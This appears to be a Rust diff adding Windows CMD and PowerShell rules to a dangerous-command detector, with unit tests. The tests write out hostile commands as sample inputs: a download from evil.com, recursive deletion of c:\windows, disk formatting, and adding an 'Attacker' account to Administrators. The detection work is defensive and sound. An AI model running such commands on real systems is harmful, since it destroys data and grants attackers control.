@@ -539,6 +539,693 @@ static DANGEROUS_COMMANDS: LazyLock<Vec<DangerCheck>> = LazyLock::new(|| {
                 }
             }),
         },
+
+        // ========================================================================
+        // Windows CMD Commands
+        // ========================================================================
+
+        // Windows file deletion (del, erase)
+        DangerCheck {
+            command: "del",
+            check: Box::new(|args| {
+                let has_force = args.iter().any(|a| {
+                    a.eq_ignore_ascii_case("/f") || a.eq_ignore_ascii_case("/q")
+                });
+                let has_recursive = args.iter().any(|a| a.eq_ignore_ascii_case("/s"));
+                let targets_system = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower.starts_with("c:\\windows") || lower.starts_with("c:\\program")
+                        || lower == "c:\\" || lower == "*.*"
+                });
+
+                if has_force && has_recursive && targets_system {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "del /f /s on system directory is extremely dangerous".to_string(),
+                        severity: 5,
+                    })
+                } else if has_force && has_recursive {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "del /f /s can permanently delete files".to_string(),
+                        severity: 3,
+                    })
+                } else if has_force {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "del /f bypasses confirmation".to_string(),
+                        severity: 2,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "erase",
+            check: Box::new(|args| {
+                let has_force = args.iter().any(|a| {
+                    a.eq_ignore_ascii_case("/f") || a.eq_ignore_ascii_case("/q")
+                });
+                if has_force {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "erase /f can permanently delete files".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // Windows directory removal (rmdir, rd)
+        DangerCheck {
+            command: "rmdir",
+            check: Box::new(|args| {
+                let has_recursive = args.iter().any(|a| a.eq_ignore_ascii_case("/s"));
+                let has_quiet = args.iter().any(|a| a.eq_ignore_ascii_case("/q"));
+                if has_recursive && has_quiet {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "rmdir /s /q removes directories without confirmation".to_string(),
+                        severity: 4,
+                    })
+                } else if has_recursive {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "rmdir /s removes directories recursively".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "rd",
+            check: Box::new(|args| {
+                let has_recursive = args.iter().any(|a| a.eq_ignore_ascii_case("/s"));
+                let has_quiet = args.iter().any(|a| a.eq_ignore_ascii_case("/q"));
+                if has_recursive && has_quiet {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "rd /s /q removes directories without confirmation".to_string(),
+                        severity: 4,
+                    })
+                } else if has_recursive {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "rd /s removes directories recursively".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // Windows disk operations
+        DangerCheck {
+            command: "format",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::DiskOperation,
+                    reason: "format destroys all data on disk".to_string(),
+                    severity: 5,
+                })
+            }),
+        },
+        DangerCheck {
+            command: "diskpart",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::DiskOperation,
+                    reason: "diskpart modifies disk partitions".to_string(),
+                    severity: 5,
+                })
+            }),
+        },
+
+        // Windows registry modification
+        DangerCheck {
+            command: "reg",
+            check: Box::new(|args| {
+                match args.first().map(|s| s.to_lowercase()).as_deref() {
+                    Some("delete") | Some("add") | Some("import") => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::SystemModification,
+                            reason: format!("reg {} modifies Windows registry", args.first().unwrap()),
+                            severity: 4,
+                        })
+                    }
+                    _ => None,
+                }
+            }),
+        },
+        DangerCheck {
+            command: "regedit",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::SystemModification,
+                    reason: "regedit modifies Windows registry".to_string(),
+                    severity: 4,
+                })
+            }),
+        },
+
+        // Windows privilege escalation
+        DangerCheck {
+            command: "runas",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::PrivilegeEscalation,
+                    reason: "runas runs commands as another user".to_string(),
+                    severity: 4,
+                })
+            }),
+        },
+
+        // Windows permission changes
+        DangerCheck {
+            command: "takeown",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::SystemModification,
+                    reason: "takeown changes file ownership".to_string(),
+                    severity: 3,
+                })
+            }),
+        },
+        DangerCheck {
+            command: "icacls",
+            check: Box::new(|args| {
+                let modifying = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower.starts_with("/grant") || lower.starts_with("/deny")
+                        || lower.starts_with("/remove") || lower.starts_with("/reset")
+                });
+                if modifying {
+                    Some(DangerousPattern {
+                        kind: DangerKind::SystemModification,
+                        reason: "icacls modifies file permissions".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "cacls",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::SystemModification,
+                    reason: "cacls modifies file access control lists".to_string(),
+                    severity: 3,
+                })
+            }),
+        },
+
+        // Windows network/user management
+        DangerCheck {
+            command: "net",
+            check: Box::new(|args| {
+                match args.first().map(|s| s.to_lowercase()).as_deref() {
+                    Some("user") if args.iter().any(|a| a.eq_ignore_ascii_case("/add") || a.eq_ignore_ascii_case("/delete")) => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::SystemModification,
+                            reason: "net user modifies user accounts".to_string(),
+                            severity: 4,
+                        })
+                    }
+                    Some("localgroup") if args.iter().any(|a| a.eq_ignore_ascii_case("/add") || a.eq_ignore_ascii_case("/delete")) => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::SystemModification,
+                            reason: "net localgroup modifies group membership".to_string(),
+                            severity: 4,
+                        })
+                    }
+                    Some("share") => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::NetworkExfiltration,
+                            reason: "net share modifies network shares".to_string(),
+                            severity: 3,
+                        })
+                    }
+                    Some("stop") | Some("start") => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::ProcessControl,
+                            reason: format!("net {} modifies services", args.first().unwrap()),
+                            severity: 3,
+                        })
+                    }
+                    _ => None,
+                }
+            }),
+        },
+
+        // Windows service control
+        DangerCheck {
+            command: "sc",
+            check: Box::new(|args| {
+                match args.first().map(|s| s.to_lowercase()).as_deref() {
+                    Some("delete") | Some("create") | Some("config") => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::ProcessControl,
+                            reason: format!("sc {} modifies Windows services", args.first().unwrap()),
+                            severity: 4,
+                        })
+                    }
+                    Some("stop") | Some("start") => {
+                        Some(DangerousPattern {
+                            kind: DangerKind::ProcessControl,
+                            reason: format!("sc {} controls services", args.first().unwrap()),
+                            severity: 3,
+                        })
+                    }
+                    _ => None,
+                }
+            }),
+        },
+
+        // Windows scheduled tasks
+        DangerCheck {
+            command: "schtasks",
+            check: Box::new(|args| {
+                let modifying = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower == "/create" || lower == "/delete" || lower == "/change"
+                });
+                if modifying {
+                    Some(DangerousPattern {
+                        kind: DangerKind::SystemModification,
+                        reason: "schtasks modifies scheduled tasks".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // Windows Management Instrumentation
+        DangerCheck {
+            command: "wmic",
+            check: Box::new(|args| {
+                let has_delete = args.iter().any(|a| a.eq_ignore_ascii_case("delete"));
+                let has_process_call = args.iter().any(|a| a.eq_ignore_ascii_case("call"));
+                if has_delete {
+                    Some(DangerousPattern {
+                        kind: DangerKind::SystemModification,
+                        reason: "wmic delete can remove system components".to_string(),
+                        severity: 4,
+                    })
+                } else if has_process_call {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "wmic call can execute arbitrary commands".to_string(),
+                        severity: 4,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // Windows Secure Delete
+        DangerCheck {
+            command: "cipher",
+            check: Box::new(|args| {
+                let has_wipe = args.iter().any(|a| a.eq_ignore_ascii_case("/w"));
+                if has_wipe {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "cipher /w securely wipes free space".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // Windows shutdown/restart
+        DangerCheck {
+            command: "shutdown",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::ProcessControl,
+                    reason: "shutdown can restart or power off the system".to_string(),
+                    severity: 3,
+                })
+            }),
+        },
+
+        // ========================================================================
+        // PowerShell Commands
+        // ========================================================================
+
+        // PowerShell execution
+        DangerCheck {
+            command: "powershell",
+            check: Box::new(|args| {
+                let has_exec = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower == "-command" || lower == "-c" || lower == "-encodedcommand"
+                        || lower == "-e" || lower == "-file" || lower == "-f"
+                });
+                if has_exec {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "powershell executes commands or scripts".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "powershell.exe",
+            check: Box::new(|args| {
+                let has_exec = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower == "-command" || lower == "-c" || lower == "-encodedcommand"
+                        || lower == "-e" || lower == "-file" || lower == "-f"
+                });
+                if has_exec {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "powershell.exe executes commands or scripts".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "pwsh",
+            check: Box::new(|args| {
+                let has_exec = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower == "-command" || lower == "-c" || lower == "-file" || lower == "-f"
+                });
+                if has_exec {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "pwsh (PowerShell Core) executes commands".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // PowerShell file deletion
+        DangerCheck {
+            command: "Remove-Item",
+            check: Box::new(|args| {
+                let has_force = args.iter().any(|a| a.eq_ignore_ascii_case("-Force"));
+                let has_recurse = args.iter().any(|a| a.eq_ignore_ascii_case("-Recurse"));
+                if has_force && has_recurse {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "Remove-Item -Recurse -Force permanently deletes files".to_string(),
+                        severity: 4,
+                    })
+                } else if has_force || has_recurse {
+                    Some(DangerousPattern {
+                        kind: DangerKind::FileDestruction,
+                        reason: "Remove-Item can delete files".to_string(),
+                        severity: 2,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // PowerShell content modification
+        DangerCheck {
+            command: "Clear-Content",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::FileDestruction,
+                    reason: "Clear-Content erases file contents".to_string(),
+                    severity: 3,
+                })
+            }),
+        },
+
+        // PowerShell execution policy
+        DangerCheck {
+            command: "Set-ExecutionPolicy",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::SystemModification,
+                    reason: "Set-ExecutionPolicy changes script execution security".to_string(),
+                    severity: 4,
+                })
+            }),
+        },
+
+        // PowerShell arbitrary code execution
+        DangerCheck {
+            command: "Invoke-Expression",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::RemoteCodeExecution,
+                    reason: "Invoke-Expression executes arbitrary code".to_string(),
+                    severity: 5,
+                })
+            }),
+        },
+        DangerCheck {
+            command: "iex",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::RemoteCodeExecution,
+                    reason: "iex (Invoke-Expression) executes arbitrary code".to_string(),
+                    severity: 5,
+                })
+            }),
+        },
+
+        // PowerShell downloads
+        DangerCheck {
+            command: "Invoke-WebRequest",
+            check: Box::new(|args| {
+                let has_outfile = args.iter().any(|a| a.eq_ignore_ascii_case("-OutFile"));
+                if has_outfile {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "Invoke-WebRequest downloads files from internet".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    Some(DangerousPattern {
+                        kind: DangerKind::NetworkExfiltration,
+                        reason: "Invoke-WebRequest accesses remote resources".to_string(),
+                        severity: 2,
+                    })
+                }
+            }),
+        },
+        DangerCheck {
+            command: "Invoke-RestMethod",
+            check: Box::new(|args| {
+                let has_body = args.iter().any(|a| a.eq_ignore_ascii_case("-Body"));
+                if has_body {
+                    Some(DangerousPattern {
+                        kind: DangerKind::NetworkExfiltration,
+                        reason: "Invoke-RestMethod can upload data".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    Some(DangerousPattern {
+                        kind: DangerKind::NetworkExfiltration,
+                        reason: "Invoke-RestMethod accesses remote APIs".to_string(),
+                        severity: 2,
+                    })
+                }
+            }),
+        },
+
+        // PowerShell registry modification
+        DangerCheck {
+            command: "Set-ItemProperty",
+            check: Box::new(|args| {
+                let targets_registry = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower.contains("hklm:") || lower.contains("hkcu:")
+                        || lower.contains("registry::")
+                });
+                if targets_registry {
+                    Some(DangerousPattern {
+                        kind: DangerKind::SystemModification,
+                        reason: "Set-ItemProperty modifies Windows registry".to_string(),
+                        severity: 4,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "New-ItemProperty",
+            check: Box::new(|args| {
+                let targets_registry = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower.contains("hklm:") || lower.contains("hkcu:")
+                });
+                if targets_registry {
+                    Some(DangerousPattern {
+                        kind: DangerKind::SystemModification,
+                        reason: "New-ItemProperty creates registry entries".to_string(),
+                        severity: 4,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+
+        // PowerShell service control
+        DangerCheck {
+            command: "Stop-Service",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::ProcessControl,
+                    reason: "Stop-Service can stop critical services".to_string(),
+                    severity: 3,
+                })
+            }),
+        },
+        DangerCheck {
+            command: "Remove-Service",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::SystemModification,
+                    reason: "Remove-Service deletes Windows services".to_string(),
+                    severity: 4,
+                })
+            }),
+        },
+
+        // PowerShell user management
+        DangerCheck {
+            command: "Add-LocalGroupMember",
+            check: Box::new(|args| {
+                let adds_to_admin = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower.contains("administrators")
+                });
+                if adds_to_admin {
+                    Some(DangerousPattern {
+                        kind: DangerKind::PrivilegeEscalation,
+                        reason: "Add-LocalGroupMember adds user to Administrators".to_string(),
+                        severity: 5,
+                    })
+                } else {
+                    Some(DangerousPattern {
+                        kind: DangerKind::SystemModification,
+                        reason: "Add-LocalGroupMember modifies group membership".to_string(),
+                        severity: 3,
+                    })
+                }
+            }),
+        },
+        DangerCheck {
+            command: "New-LocalUser",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::SystemModification,
+                    reason: "New-LocalUser creates local user accounts".to_string(),
+                    severity: 4,
+                })
+            }),
+        },
+
+        // PowerShell process execution
+        DangerCheck {
+            command: "Start-Process",
+            check: Box::new(|args| {
+                let has_verb_runas = args.iter().any(|a| {
+                    let lower = a.to_lowercase();
+                    lower.contains("-verb") && args.iter().any(|b| b.eq_ignore_ascii_case("runas"))
+                });
+                if has_verb_runas {
+                    Some(DangerousPattern {
+                        kind: DangerKind::PrivilegeEscalation,
+                        reason: "Start-Process with -Verb RunAs elevates privileges".to_string(),
+                        severity: 4,
+                    })
+                } else {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "Start-Process launches external programs".to_string(),
+                        severity: 2,
+                    })
+                }
+            }),
+        },
+
+        // PowerShell disk operations
+        DangerCheck {
+            command: "Format-Volume",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::DiskOperation,
+                    reason: "Format-Volume destroys all data on volume".to_string(),
+                    severity: 5,
+                })
+            }),
+        },
+        DangerCheck {
+            command: "Clear-Disk",
+            check: Box::new(|_| {
+                Some(DangerousPattern {
+                    kind: DangerKind::DiskOperation,
+                    reason: "Clear-Disk removes all partitions from disk".to_string(),
+                    severity: 5,
+                })
+            }),
+        },
+
+        // CMD.exe execution
+        DangerCheck {
+            command: "cmd",
+            check: Box::new(|args| {
+                let has_exec = args.iter().any(|a| a.eq_ignore_ascii_case("/c") || a.eq_ignore_ascii_case("/k"));
+                if has_exec {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "cmd /c executes commands".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
+        DangerCheck {
+            command: "cmd.exe",
+            check: Box::new(|args| {
+                let has_exec = args.iter().any(|a| a.eq_ignore_ascii_case("/c") || a.eq_ignore_ascii_case("/k"));
+                if has_exec {
+                    Some(DangerousPattern {
+                        kind: DangerKind::RemoteCodeExecution,
+                        reason: "cmd.exe /c executes commands".to_string(),
+                        severity: 3,
+                    })
+                } else {
+                    None
+                }
+            }),
+        },
     ]
 });
 
@@ -838,5 +1525,112 @@ mod tests {
         assert!(is_dangerous_command(&["apt", "install", "vim"]));
         assert!(is_dangerous_command(&["brew", "install", "wget"]));
         assert!(!is_dangerous_command(&["apt", "search", "vim"]));
+    }
+
+    // ========================================================================
+    // Windows CMD Tests
+    // ========================================================================
+
+    #[test]
+    fn test_windows_del() {
+        assert!(is_dangerous_command(&["del", "/f", "/s", "c:\\windows"]));
+        assert!(is_dangerous_command(&["del", "/f", "file.txt"]));
+        assert!(!is_dangerous_command(&["del", "file.txt"]));
+    }
+
+    #[test]
+    fn test_windows_rmdir() {
+        assert!(is_dangerous_command(&["rmdir", "/s", "/q", "folder"]));
+        assert!(is_dangerous_command(&["rd", "/s", "folder"]));
+        assert!(!is_dangerous_command(&["rmdir", "folder"]));
+    }
+
+    #[test]
+    fn test_windows_disk_ops() {
+        assert!(is_dangerous_command(&["format", "c:"]));
+        assert!(is_dangerous_command(&["diskpart"]));
+    }
+
+    #[test]
+    fn test_windows_registry() {
+        assert!(is_dangerous_command(&["reg", "add", "HKLM\\SOFTWARE\\Test"]));
+        assert!(is_dangerous_command(&["reg", "delete", "HKCU\\Test"]));
+        assert!(!is_dangerous_command(&["reg", "query", "HKLM"]));
+    }
+
+    #[test]
+    fn test_windows_user_management() {
+        assert!(is_dangerous_command(&["net", "user", "test", "/add"]));
+        assert!(is_dangerous_command(&["net", "localgroup", "admins", "test", "/add"]));
+        assert!(is_dangerous_command(&["net", "stop", "spooler"]));
+    }
+
+    #[test]
+    fn test_windows_service_control() {
+        assert!(is_dangerous_command(&["sc", "delete", "myservice"]));
+        assert!(is_dangerous_command(&["sc", "stop", "spooler"]));
+        assert!(!is_dangerous_command(&["sc", "query", "spooler"]));
+    }
+
+    // ========================================================================
+    // PowerShell Tests
+    // ========================================================================
+
+    #[test]
+    fn test_powershell_execution() {
+        assert!(is_dangerous_command(&["powershell", "-command", "Get-Process"]));
+        assert!(is_dangerous_command(&["pwsh", "-c", "ls"]));
+        assert!(is_dangerous_command(&["powershell.exe", "-EncodedCommand", "base64"]));
+    }
+
+    #[test]
+    fn test_powershell_remove_item() {
+        assert!(is_dangerous_command(&["Remove-Item", "-Recurse", "-Force", "C:\\folder"]));
+        assert!(is_dangerous_command(&["Remove-Item", "-Force", "file.txt"]));
+        assert!(!is_dangerous_command(&["Remove-Item", "file.txt"]));
+    }
+
+    #[test]
+    fn test_powershell_code_execution() {
+        assert!(is_dangerous_command(&["Invoke-Expression", "code"]));
+        assert!(is_dangerous_command(&["iex", "$script"]));
+        assert!(is_dangerous_command(&["Set-ExecutionPolicy", "Bypass"]));
+    }
+
+    #[test]
+    fn test_powershell_web_requests() {
+        assert!(is_dangerous_command(&["Invoke-WebRequest", "-Uri", "http://evil.com", "-OutFile", "script.ps1"]));
+        assert!(is_dangerous_command(&["Invoke-RestMethod", "-Uri", "http://api.com", "-Body", "data"]));
+    }
+
+    #[test]
+    fn test_powershell_registry() {
+        assert!(is_dangerous_command(&["Set-ItemProperty", "-Path", "HKLM:\\SOFTWARE", "-Name", "test", "-Value", "1"]));
+        assert!(!is_dangerous_command(&["Set-ItemProperty", "-Path", "C:\\file.txt", "-Name", "Attr"]));
+    }
+
+    #[test]
+    fn test_powershell_service() {
+        assert!(is_dangerous_command(&["Stop-Service", "-Name", "Spooler"]));
+        assert!(is_dangerous_command(&["Remove-Service", "-Name", "MyService"]));
+    }
+
+    #[test]
+    fn test_powershell_user_management() {
+        assert!(is_dangerous_command(&["Add-LocalGroupMember", "-Group", "Administrators", "-Member", "Attacker"]));
+        assert!(is_dangerous_command(&["New-LocalUser", "-Name", "test"]));
+    }
+
+    #[test]
+    fn test_powershell_disk() {
+        assert!(is_dangerous_command(&["Format-Volume", "-DriveLetter", "D"]));
+        assert!(is_dangerous_command(&["Clear-Disk", "-Number", "1"]));
+    }
+
+    #[test]
+    fn test_cmd_execution() {
+        assert!(is_dangerous_command(&["cmd", "/c", "del file.txt"]));
+        assert!(is_dangerous_command(&["cmd.exe", "/k", "dir"]));
+        assert!(!is_dangerous_command(&["cmd"])); // No execution flag
     }
 }
